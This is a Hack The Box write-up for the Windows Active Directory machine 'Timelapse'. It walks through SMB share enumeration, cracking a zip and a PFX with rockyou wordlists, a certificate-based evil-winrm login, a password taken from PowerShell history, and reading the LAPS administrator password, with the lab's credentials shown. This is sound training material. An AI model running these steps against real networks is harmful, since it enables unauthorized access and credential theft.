---
title: "Timelapse Hackthebox writeup"
author: "0xMesbaha"
cover: "/media/timelapse/20220820143425.png"
tags: ["Hackthebox", "Active-directory" , "LAPS" , "pfx"]
date: 2022-08-20T00:49:18+18:08
draft: false
---
In this Box we are against a windows machine has the active directory service installed on it , we can list files on smb shares and access some shared folder to find a backup.zip file which contains a pfx file for a user on the domain , we can also find some hints about LAPS. after extracting the key and certificate from the pfx file we can login using WinRM. then checking the powershell history we can see password for another user which is a memeber of the LAPS_READERS Group so the other user can read the administrator password in clear text 
<!--more-->


## Scanning 

```bash
nmap -Pn -A -T4 10.10.11.152 -oN nmap.intial
```
Output 

```bash
PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-20 21:08:49Z)
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds?
464/tcp open  kpasswd5?
593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m58s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-08-20T21:09:00
|_  start_date: N/A
```

we can see this machine has the Active directory service installed on it because of the DNS service and the kpassword5 ports are open 

if we make a full port scan we will get :
```bash
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49696/tcp open  unknown
52713/tcp open  unknown
```
port `5986` is open which is the WinRm port which we can use to login to the box using `evil-winrm` tool , so we maybe use it latter.
## Enumeration

We can start Enumerating the smb service to check if we have access without providing passwords :
```cmd
smbclient -L 10.10.11.152             
Enter WORKGROUP\kali's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```
we can list the folders without any password , we can go check non defaults folders like `Shares`

```cmd
smbclient //10.10.11.152/Shares
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021
```
we can download the files in both of these directories to check if there is anything helpful 

```bash
-rw-r--r-- 1 kali kali 102K Aug 20 09:16 LAPS_Datasheet.docx
-rw-r--r-- 1 kali kali 627K Aug 20 09:16 LAPS_OperationsGuide.docx
-rw-r--r-- 1 kali kali  71K Aug 20 09:16 LAPS_TechnicalSpecification.docx
-rw-r--r-- 1 kali kali 1.1M Aug 20 09:16 LAPS.x64.msi
-rw-r--r-- 1 kali kali 2.6K Aug 20 09:15 winrm_backup.zip
```

From the files we have found we can assume the machine has LAPS (Local Administrator Password Solution)  installed on it to protect administrator password.

*LAPS  function is to set a different, random password for the common local administrator account on every computer in the domain*

and we have `winrm_backup.zip` which we can try to open but will find it is protected with a password , we can try crack it :

```bash
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u  winrm_backup.zip

PASSWORD FOUND!!!!: pw == supremelegacy
```

By Extracting the zip file we will get `legacyy_dev_auth.pfx` 

*The . pfx file, which is in a PKCS#12 format, contains the SSL certificate (public keys) and the corresponding private keys*

Searching for it we will come across [this](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file) page which explains how to get the key,cert from the pfx file.  But there is a password required in the steps

![error](/media/timelapse/20220820153550.png)

we can use `crackpkcs12` tool to get the password we need 

![error](/media/timelapse/20220820153738.png)

```bash
crackpkcs12 legacyy_dev_auth.pfx -d /usr/share/wordlists/rockyou.txt

Dictionary attack - Starting 8 threads

*********************************************************
Dictionary attack - Thread 8 - Password found: thuglegacy
*********************************************************
```
now we can extract the key and the certificate we want 
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx  -nocerts -out leg.key
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out leg.crt 
```

## Foothold

We can Authenticate to the box using the key and the cert we have generated from the pfx file . as the we have said before we can use  `evil-winrm` to login so let's try :

```bash
evil-winrm -u legacy -c leg.crt -k leg.key -i 10.10.11.152 -S  
```

![error](/media/timelapse/20220820155138.png)

we can upload `Winpeas` to see if there is any low hanging fruits first :
```powershell
*Evil-WinRM* PS C:\Users\legacyy\Favorites> upload winPEAS.bat
```

and we can find under the PowerShell history `C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
```bash
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```
We can see password `E3R$Q62^12p7PLlC%KWaxuaV` and the user `svc_deploy` ,we can try to login with that user:

```bash
evil-winrm -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'  -i 10.10.11.152 -S
```
## Privilege escalation

After logging in successfully with that user, we can think of the LAPs we have found earlier maybe it was there for a reason.

Reading [here](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/laps) we can check if it is installed using :
```bash
Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'
```
and it is indeed installed , reading about LAPS Attributes we can see this , maybe the `ms-Mcs-AdmPwd` is misconfigured 
 
![error](/media/timelapse/20220820162732.png)

**The Misconfiguration :**

![error](/media/timelapse/20220820163538.png)

```bash
Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | Select-Object 'Name','ms-Mcs-AdmPwd'
```

![error](/media/timelapse/20220820162833.png)
And we have access to the administrator password in clear text ! , we can try to login with the administrator password

```bash
evil-winrm -u administrator -p '1M-btm[l8iH]K{[OigWn3zV%'  -i 10.10.11.152 -S
```

and we are in as administrator

![error](/media/timelapse/20220820163026.png)


### pwned